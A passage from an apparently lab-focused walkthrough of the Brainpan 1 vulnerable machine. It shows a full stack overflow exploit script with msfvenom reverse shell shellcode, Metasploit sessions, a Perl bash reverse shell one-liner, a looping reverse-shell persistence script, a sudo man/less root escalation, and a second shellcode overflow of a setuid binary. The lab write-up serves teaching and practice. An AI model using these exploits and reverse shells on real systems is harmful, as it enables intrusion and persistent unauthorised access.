*%esp</div></div><div><br/></div><div>2) Use mona</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>!mona find -s "\xff\xe4" -m brainpan.exe</div></div><div><br/></div><div><img height="338" src="/assets/images/2019-04-15-brainpan-1/96425663-7352-4CDF-A59D-890720699B9F.png" width="1152"/><br/></div><div><br/></div><div>In both cases, we end up with the address 311712f3. In Immunity Debugger, we can also jump to that address and confirm.</div><div><br/></div><div><img height="121" src="/assets/images/2019-04-15-brainpan-1/CFEAE550-5683-45B0-B285-2CB2CD2FB18E.png" width="483"/><br/></div><div><br/></div><div>We'll run one more test with our python script to confirm we can set the EIP to the JMP ESP address and have it end up at the ESP.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/brainpan# cat overflow4.py </div><div>#!/usr/bin/python</div><div>import socket</div><div>s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div><div><br/></div></div><div># JMP ESP address = 0x311712F3 = \x31\x17\x12\xF3</div><div># Because of Little Endian, we need to reverse the address to \xF3\x12\x17\x31</div><div><div><br/></div></div><div>buffer = "A"*524 + "\xF3\x12\x17\x31" + "C"*467 + "D"</div><div><div><br/></div></div><div>try:</div><div>  print "Sending evil buffer..."</div><div>  s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div>  s.settimeout(2)</div><div>  s.connect(('10.183.0.187',9999))</div><div>  s.recv(1024)</div><div>  s.send(buffer + '\n')</div><div>  print "Done!"</div><div>except:</div><div>  print "Could not connect to TCP port 9999"</div></div><div><br/></div><div>We'll restart brainpan.exe and Immunity Debugger on our Windows machine then re-attach and press F9. Now, let's send our last test and check the registers.</div><div><br/></div><div><img height="572" src="/assets/images/2019-04-15-brainpan-1/66E90DCA-796A-414E-8649-1861209F4A1C.png" width="315"/><br/></div><div><br/></div><div>Down in the memory stack, in between the As and the Cs we can see our JMP ESP address (F3 on one line, then 12 17 31, reading from right to left). We can also see the EIP is set to the memory address at the end of all our Cs.</div><div><br/></div><div>Time to replace our Cs with actual shell code. We will generate our shell code with msfvenom, excluding the one bad character we want to avoid (\x00).</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/brainpan# msfvenom -p windows/shell_reverse_tcp LHOST=10.183.0.222 LPORT=5432 -f c –e x86/shikata_ga_nai -b "\x00"</div><div>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</div><div>[-] No arch selected, selecting arch: x86 from the payload</div><div>Found 11 compatible encoders</div><div>Attempting to encode payload with 1 iterations of x86/shikata_ga_nai</div><div>x86/shikata_ga_nai succeeded with size 351 (iteration=0)</div><div>x86/shikata_ga_nai chosen with final size 351</div><div><font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">Payload size: 351 bytes</font></div><div>Final size of c file: 1500 bytes</div><div>unsigned char buf[] = </div><div>"\xd9\xc2\xba\x51\x6d\x04\x76\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"</div><div>"\x52\x31\x53\x17\x03\x53\x17\x83\x92\x69\xe6\x83\xe8\x9a\x64"</div><div>"\x6b\x10\x5b\x09\xe5\xf5\x6a\x09\x91\x7e\xdc\xb9\xd1\xd2\xd1"</div><div>"\x32\xb7\xc6\x62\x36\x10\xe9\xc3\xfd\x46\xc4\xd4\xae\xbb\x47"</div><div>"\x57\xad\xef\xa7\x66\x7e\xe2\xa6\xaf\x63\x0f\xfa\x78\xef\xa2"</div><div>"\xea\x0d\xa5\x7e\x81\x5e\x2b\x07\x76\x16\x4a\x26\x29\x2c\x15"</div><div>"\xe8\xc8\xe1\x2d\xa1\xd2\xe6\x08\x7b\x69\xdc\xe7\x7a\xbb\x2c"</div><div>"\x07\xd0\x82\x80\xfa\x28\xc3\x27\xe5\x5e\x3d\x54\x98\x58\xfa"</div><div>"\x26\x46\xec\x18\x80\x0d\x56\xc4\x30\xc1\x01\x8f\x3f\xae\x46"</div><div>"\xd7\x23\x31\x8a\x6c\x5f\xba\x2d\xa2\xe9\xf8\x09\x66\xb1\x5b"</div><div>"\x33\x3f\x1f\x0d\x4c\x5f\xc0\xf2\xe8\x14\xed\xe7\x80\x77\x7a"</div><div>"\xcb\xa8\x87\x7a\x43\xba\xf4\x48\xcc\x10\x92\xe0\x85\xbe\x65"</div><div>"\x06\xbc\x07\xf9\xf9\x3f\x78\xd0\x3d\x6b\x28\x4a\x97\x14\xa3"</div><div>"\x8a\x18\xc1\x64\xda\xb6\xba\xc4\x8a\x76\x6b\xad\xc0\x78\x54"</div><div>"\xcd\xeb\x52\xfd\x64\x16\x35\x08\xce\x18\x1b\x64\x32\x18\xb6"</div><div>"\x4d\xbb\xfe\xd2\xbd\xed\xa9\x4a\x27\xb4\x21\xea\xa8\x62\x4c"</div><div>"\x2c\x22\x81\xb1\xe3\xc3\xec\xa1\x94\x23\xbb\x9b\x33\x3b\x11"</div><div>"\xb3\xd8\xae\xfe\x43\x96\xd2\xa8\x14\xff\x25\xa1\xf0\xed\x1c"</div><div>"\x1b\xe6\xef\xf9\x64\xa2\x2b\x3a\x6a\x2b\xb9\x06\x48\x3b\x07"</div><div>"\x86\xd4\x6f\xd7\xd1\x82\xd9\x91\x8b\x64\xb3\x4b\x67\x2f\x53"</div><div>"\x0d\x4b\xf0\x25\x12\x86\x86\xc9\xa3\x7f\xdf\xf6\x0c\xe8\xd7"</div><div>"\x8f\x70\x88\x18\x5a\x31\xb8\x52\xc6\x10\x51\x3b\x93\x20\x3c"</div><div>"\xbc\x4e\x66\x39\x3f\x7a\x17\xbe\x5f\x0f\x12\xfa\xe7\xfc\x6e"</div><div>"\x93\x8d\x02\xdc\x94\x87";</div></div><div><br/></div><div>Our payload is 351 bytes, which is enough to fit into our overflowable space. Let's add the shell code to our python script and see if we can pop this service.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/brainpan# cat overflow-final.py</div><div>#!/usr/bin/python</div><div>import socket</div><div>s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div><div><br/></div></div><div># generated with the following msfvenom command</div><div># msfvenom -p windows/shell_reverse_tcp LHOST=10.183.0.222 LPORT=5432  [...]</div><div>payload=(</div><div>"\xd9\xc2\xba\x51\x6d\x04\x76\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"</div><div>"\x52\x31\x53\x17\x03\x53\x17\x83\x92\x69\xe6\x83\xe8\x9a\x64"</div><div>"\x6b\x10\x5b\x09\xe5\xf5\x6a\x09\x91\x7e\xdc\xb9\xd1\xd2\xd1"</div><div>"\x32\xb7\xc6\x62\x36\x10\xe9\xc3\xfd\x46\xc4\xd4\xae\xbb\x47"</div><div>"\x57\xad\xef\xa7\x66\x7e\xe2\xa6\xaf\x63\x0f\xfa\x78\xef\xa2"</div><div>"\xea\x0d\xa5\x7e\x81\x5e\x2b\x07\x76\x16\x4a\x26\x29\x2c\x15"</div><div>"\xe8\xc8\xe1\x2d\xa1\xd2\xe6\x08\x7b\x69\xdc\xe7\x7a\xbb\x2c"</div><div>"\x07\xd0\x82\x80\xfa\x28\xc3\x27\xe5\x5e\x3d\x54\x98\x58\xfa"</div><div>"\x26\x46\xec\x18\x80\x0d\x56\xc4\x30\xc1\x01\x8f\x3f\xae\x46"</div><div>"\xd7\x23\x31\x8a\x6c\x5f\xba\x2d\xa2\xe9\xf8\x09\x66\xb1\x5b"</div><div>"\x33\x3f\x1f\x0d\x4c\x5f\xc0\xf2\xe8\x14\xed\xe7\x80\x77\x7a"</div><div>"\xcb\xa8\x87\x7a\x43\xba\xf4\x48\xcc\x10\x92\xe0\x85\xbe\x65"</div><div>"\x06\xbc\x07\xf9\xf9\x3f\x78\xd0\x3d\x6b\x28\x4a\x97\x14\xa3"</div><div>"\x8a\x18\xc1\x64\xda\xb6\xba\xc4\x8a\x76\x6b\xad\xc0\x78\x54"</div><div>"\xcd\xeb\x52\xfd\x64\x16\x35\x08\xce\x18\x1b\x64\x32\x18\xb6"</div><div>"\x4d\xbb\xfe\xd2\xbd\xed\xa9\x4a\x27\xb4\x21\xea\xa8\x62\x4c"</div><div>"\x2c\x22\x81\xb1\xe3\xc3\xec\xa1\x94\x23\xbb\x9b\x33\x3b\x11"</div><div>"\xb3\xd8\xae\xfe\x43\x96\xd2\xa8\x14\xff\x25\xa1\xf0\xed\x1c"</div><div>"\x1b\xe6\xef\xf9\x64\xa2\x2b\x3a\x6a\x2b\xb9\x06\x48\x3b\x07"</div><div>"\x86\xd4\x6f\xd7\xd1\x82\xd9\x91\x8b\x64\xb3\x4b\x67\x2f\x53"</div><div>"\x0d\x4b\xf0\x25\x12\x86\x86\xc9\xa3\x7f\xdf\xf6\x0c\xe8\xd7"</div><div>"\x8f\x70\x88\x18\x5a\x31\xb8\x52\xc6\x10\x51\x3b\x93\x20\x3c"</div><div>"\xbc\x4e\x66\x39\x3f\x7a\x17\xbe\x5f\x0f\x12\xfa\xe7\xfc\x6e"</div><div>"\x93\x8d\x02\xdc\x94\x87")</div><div><div><br/></div></div><div># JMP ESP address = 0x311712F3 = \x31\x17\x12\xF3</div><div># Because of Little Endian, we need to reverse the address to \xF3\x12\x17\x31</div><div>jmp_esp="\xF3\x12\x17\x31"</div><div><div><br/></div></div><div># a NOP slide (no operation instruction - "\x90") will ensure the start of</div><div># our shell code isn't overwritten </div><div># when hitting these instructions, control will "slide" down to our exploit code</div><div>nop_slide="\x90"*16</div><div><div><br/></div></div><div>buffer = "A"*524 + jmp_esp + nop_slide + payload + "C"*(472 - 16 - 351)</div><div><div><br/></div></div><div>try:</div><div>  print "Sending evil buffer..."   </div><div>  s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div>  s.settimeout(2)</div><div>  s.connect(('10.183.0.187',9999)) </div><div>  s.recv(1024)</div><div>  s.send(buffer + '\n')</div><div>  print "Done!"</div><div>except:</div><div>  print "Could not connect to TCP port 9999"</div></div><div><br/></div><div>Before testing our exploit, we'll start our listener in Metasploit.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>msf5 &gt; use exploit/multi/handler</div><div>msf5 exploit(multi/handler) &gt; set payload windows/shell_reverse_tcp</div><div>payload =&gt; windows/shell_reverse_tcp</div><div>msf5 exploit(multi/handler) &gt; set LHOST 10.183.0.222</div><div>LHOST =&gt; 10.183.0.222</div><div>msf5 exploit(multi/handler) &gt; set LPORT 5432</div><div>LPORT =&gt; 5432</div><div>msf5 exploit(multi/handler) &gt; run -j</div><div>[*] Exploit running as background job 0.</div><div>[*] Exploit completed, but no session was created.</div><div><div><br/></div><div><br/></div></div><div>[*] Started reverse TCP handler on 10.183.0.222:5432 </div></div><div><br/></div><div>Time to restart brainpan.exe and Immunity Debugger on our Windows machine then re-attach and press F9 one last time. Overflow to shell?</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>msf5 exploit(multi/handler) &gt; [*] Command shell session 1 opened (10.183.0.222:5432 -&gt; 10.183.0.187:49212) at 2019-04-24 16:49:05 -0400</div><div><div><br/></div></div><div>msf5 exploit(multi/handler) &gt; sessions</div><div><div><br/></div></div><div>Active sessions</div><div>===============</div><div><div><br/></div></div><div>  Id  Name  Type               Information  Connection</div><div>  --  ----  ----               -----------  ----------</div><div>  1         shell x86/windows               10.183.0.222:5432 -&gt; 10.183.0.187:49212 (10.183.0.187)</div><div><div><br/></div></div><div>msf5 exploit(multi/handler) &gt; sessions 1</div><div>[*] Starting interaction with 1...</div><div><div><br/></div></div><div>Microsoft Windows [Version 6.1.7601]</div><div>Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</div></div><div><br/></div><div>Nice! Worked against my testing Windows machine. Now let's change the IP address in our python script and try it against 10.183.0.203.</div><div><br/></div><div>Before running it, I'll kill my session in Metasploit and restart the listener. Overflow to shell of 10.183.0.203?</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>msf5 exploit(multi/handler) &gt; [*] Command shell session 2 opened (10.183.0.222:5432 -&gt; 10.183.0.203:34361) at 2019-04-24 16:55:36 -0400</div><div><div><br/></div></div><div>msf5 exploit(multi/handler) &gt; sessions</div><div><div><br/></div></div><div>Active sessions</div><div>===============</div><div><div><br/></div></div><div>  Id  Name  Type               Information                      Connection</div><div>  --  ----  ----               -----------                      ----------</div><div>  2         shell x86/windows  CMD Version 1.4.1 Z:\home\puck&gt;  10.183.0.222:5432 -&gt; 10.183.0.203:34361 (10.183.0.203)</div><div><div><br/></div></div><div>msf5 exploit(multi/handler) &gt; sessions 2</div><div>[*] Starting interaction with 2...</div><div><div><br/></div></div><div>Z:\home\puck&gt;</div></div><div><br/></div><div>Yes! We have access.</div><div><br/></div><div>Our exploit drops us into a wine command shell. We'd prefer to break out into a regular bash shell. Thankfully, we are able to navigate back to the underlying Linux system's root (on the Z: drive) and run native commands.</div><div><br/></div><div>I'll start another listener in Metasploit for a regular reverse shell and then call the native perl to spawn a bash reverse shell.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>Z:\home\puck&gt;Z:\usr\bin\perl -e "use Socket;$i='10.183.0.222';$p=5433;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,'&gt;&amp;S');open(STDOUT,'&gt;&amp;S');open(STDERR,'&gt;&amp;S');exec('/bin/bash -i');};"</div><div><div><br/></div></div><div>Z:\home\puck&gt;[*] Command shell session 3 opened (10.183.0.222:5433 -&gt; 10.183.0.203:45345) at 2019-04-24 17:01:44 -0400</div><div>msf5 exploit(multi/handler) &gt; sessions 3</div><div>[*] Starting interaction with 3...</div><div><div><br/></div></div><div>puck@brainpan:~$ id</div><div>uid=1002(puck) gid=1002(puck) groups=1002(puck)</div></div><div><br/></div><div><br/></div><div><h2>Maintaining Access</h2></div><div><br/></div><div>The host doesn't have SSH access available, so I decided to create a simple shell script that will try to connect back to my attacking machine every 5 minutes and use python's SimpleHTTPServer to serve it up to the victim.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/brainpan# cat thumbs </div><div>#!/bin/sh</div><div>while true; do</div><div>    perl -e 'use Socket;$i="10.183.0.222";$p=5433;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");};'</div><div>    # sleep for 300 seconds (5 mins)</div><div>    sleep 300</div><div>done</div><div>root@kali:~/Walkthroughs/brainpan# python -m SimpleHTTPServer 4321</div><div>Serving HTTP on 0.0.0.0 port 4321 ...</div><div>10.183.0.203 - - [24/Apr/2019 17:08:35] "GET /thumbs HTTP/1.1" 200 -</div></div><div><br/></div><div>I downloaded the script to the victim's /home/puck/web directory and ran it in the background. Now, if I get disconnected, I should be able to restart a listener and get back in within 5 minutes.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>puck@brainpan:~/web$ wget -O thumbs 10.183.0.222:4321/thumbs</div><div>--2019-04-24 16:08:35--  http://10.183.0.222:4321/thumbs</div><div>Connecting to 10.183.0.222:4321... connected.</div><div>HTTP request sent, awaiting response... 200 OK</div><div>Length: 309 [application/octet-stream]</div><div>Saving to: `thumbs'</div><div><div><br/></div></div><div>     0K                                                       100% 47.4M=0s</div><div><div><br/></div></div><div>2019-04-24 16:08:35 (47.4 MB/s) - `thumbs' saved [309/309]</div><div><br/></div><div>puck@brainpan:~/web$ chmod +x thumbs</div><div>puck@brainpan:~/web$ ./thumbs &amp;</div><div>[1] 2147</div></div><div><br/></div><div><br/></div><div><h2>Privilege Escalation</h2></div><div><br/></div><div>Checking the operating system and kernel using uname and /etc/os-release, there aren't any good known exploits.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>puck@brainpan:~$ uname -a</div><div>Linux brainpan 3.5.0-25-generic #39-Ubuntu SMP Mon Feb 25 19:02:34 UTC 2013 i686 i686 i686 GNU/Linux</div></div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>puck@brainpan:/etc$ cat os-release</div><div>NAME="Ubuntu"</div><div>VERSION="12.10, Quantal Quetzal"</div><div>ID=ubuntu</div><div>ID_LIKE=debian</div><div>PRETTY_NAME="Ubuntu quantal (12.10)"</div><div>VERSION_ID="12.10"</div></div><div><br/></div><div>Let's see if the user has any sudo permissions.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>puck@brainpan:~$ sudo -l</div><div>Matching Defaults entries for puck on this host:</div><div>    env_reset, mail_badpass,</div><div>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</div><div><div><br/></div></div><div>User puck may run the following commands on this host:</div><div>    (root) NOPASSWD: /home/anansi/bin/anansi_util</div></div><div><br/></div><div>Interesting. Let's see what this program does.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>puck@brainpan:~$ sudo /home/anansi/bin/anansi_util</div><div>Usage: /home/anansi/bin/anansi_util [action]</div><div>Where [action] is one of:</div><div>  - network</div><div>  - proclist</div><div>  - manual [command]</div></div><div><br/></div><div>Trying each of these commands, I'm getting an error about my terminal ('unknown': unknown terminal type.) with proclist and manual. I'll use python to spawn a new pty shell.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>python -c 'import pty; pty.spawn("/bin/bash")'</div></div><div><br/></div><div>Now I'm getting warnings, but the manual command seems to be running better. Here's the deal with the manual command (more commonly shortened to 'man'), it uses 'less' to page its output. Here's the deal with less (help text accessible by pressing 'h' while in man)...</div><div><br/></div><div><img height="220" src="/assets/images/2019-04-15-brainpan-1/B95742F4-1401-430B-ABBD-BBA3EC1DB7E7.png" width="549"/><br/></div><div><br/></div><div>Notice the '!command' entry. That's right. You can execute any command from within less. So, since we can sudo a manual entry, we can sudo less, which can sudo anything we want. Let's try it...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>puck@brainpan:~$ sudo /home/anansi/bin/anansi_util manual less</div><div>No manual entry for manual</div><div>WARNING: terminal is not fully functional</div><div>-  (press RETURN)</div><div>LESS(1)                                                                LESS(1)</div><div><div><br/></div></div><div>NAME</div><div>       less - opposite of more</div><div><div><br/></div></div><div>SYNOPSIS</div><div>       less -?</div><div>       less --help</div><div>       less -V</div><div>       less --version</div><div>       less [-[+]aABcCdeEfFgGiIJKLmMnNqQrRsSuUVwWX~]</div><div>            [-b space] [-h lines] [-j line] [-k keyfile]</div><div>            [-{oO} logfile] [-p pattern] [-P prompt] [-t tag]</div><div>            [-T tagsfile] [-x tab,...] [-y lines] [-[z] lines]</div><div>            [-# shift] [+[+]cmd] [--] [filename]...</div><div>       (See  the  OPTIONS section for alternate option syntax with long option</div><div>       names.)</div><div><div><br/></div></div><div>DESCRIPTION</div><div>       Less is a program similar to more (1), but it has many  more  features.</div><div>       Less  does  not  have to read the entire input file before starting, so</div><div>       with large input files it starts up faster than text  editors  like  vi</div><div>       (1).  Less uses termcap (or terminfo on some systems), so it can run on</div><div> Manual page less(1) line 1 (press h for help or q to quit)<font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">!/bin/bash</font></div><div>root@brainpan:/usr/share/man# id  </div><div>uid=0(root) gid=0(root) groups=0(root)</div></div><div><br/></div><div>Let's get that root flag.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@brainpan:/usr/share/man# cd /root</div><div>root@brainpan:/root# cat b.txt</div><div>_|                            _|                                        </div><div>_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  </div><div>_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</div><div>_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</div><div>_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|</div><div>                                            _|                          </div><div>                                            _|</div><div><div><br/></div></div><div>                                              http://www.techorganic.com</div></div><div><br/></div><div>I guess this is the "flag". Maybe getting root is all.</div><div><br/></div><div><br/></div><div><h2>Pivoting</h2></div><div>N/A</div><div><br/></div><div><br/></div><div><h2>Clean Up</h2></div><div><br/></div><div>*** STOP /home/puck/web/thumbs ***</div><div>*** REMOVE /home/puck/web/thumbs ***</div><div><br/></div><div><br/></div><div><h2>Additional Info</h2></div><div><br/></div><div><span style="font-weight: bold;">validate</span></div><div><br/></div><div>While getting root using the man/less trick was much easier, for the sake of learning, I went ahead and worked out a buffer overflow for the validate program in /usr/local/bin.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>-rwsr-xr-x 1 anansi anansi 8761 Mar  4  2013 /usr/local/bin/validate</div></div><div><br/></div><div>The validate program is owned by anansi and has the sticky bit set (so it runs as that user).</div><div><br/></div><div>Once I worked through the same series of overflow steps as used above, I created a payload to spawn a command shell.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/brainpan# msfvenom -p linux/x86/exec CMD=/bin/sh -a x86 -f c –e x86/shikata_ga_nai -b "\x00\x09\x0a\x20\x46"</div><div>[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload</div><div>Found 11 compatible encoders</div><div>Attempting to encode payload with 1 iterations of x86/shikata_ga_nai</div><div>x86/shikata_ga_nai failed with A valid opcode permutation could not be found.</div><div>Attempting to encode payload with 1 iterations of generic/none</div><div>generic/none failed with Encoding failed due to a bad character (index=15, char=0x00)</div><div>Attempting to encode payload with 1 iterations of x86/call4_dword_xor</div><div>x86/call4_dword_xor succeeded with size 68 (iteration=0)</div><div>x86/call4_dword_xor chosen with final size 68</div><div><font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">Payload size: 68 bytes</font></div><div>Final size of c file: 311 bytes</div><div>unsigned char buf[] =</div><div>"\x31\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"</div><div>"\xfe\xa3\x49\xcc\x83\xee\xfc\xe2\xf4\x94\xa8\x11\x55\xac\xc5"</div><div>"\x21\xe1\x9d\x2a\xae\xa4\xd1\xd0\x21\xcc\x96\x8c\x2b\xa5\x90"</div><div>"\x2a\xaa\x9e\x16\xab\x49\xcc\xfe\x8c\x2b\xa5\x90\x8c\x3a\xa4"</div><div>"\xfe\xf4\x1a\x45\x1f\x6e\xc9\xcc";</div></div><div><br/></div><div>I was able to send my overflow with the payload using a simple python print statement.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>puck@brainpan:/usr/local/bin$ ./validate $(python -c 'print "\x31\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\xfe\xa3\x49\xcc\x83\xee\xfc\xe2\xf4\x94\xa8\x11\x55\xac\xc5\x21\xe1\x9d\x2a\xae\xa4\xd1\xd0\x21\xcc\x96\x8c\x2b\xa5\x90\x2a\xaa\x9e\x16\xab\x49\xcc\xfe\x8c\x2b\xa5\x90\x8c\x3a\xa4\xfe\xf4\x1a\x45\x1f\x6e\xc9\xcc" + "\x90"*(116 - 68) + "\xaf\x84\x04\x08"')</div><div>$ id</div><div>uid=1002(puck) gid=1002(puck) <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">euid=1001(anansi)</font> groups=1001(anansi),1002(puck)</div><div><span style="font-size: 12px; font-family: Monaco;"><br/></span></div></div><div><br/></div><div>Once I became the user anansi, I was able to change the /home/anansi/bin/anansi_util program to /bin/bash and sudo it to get root.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: 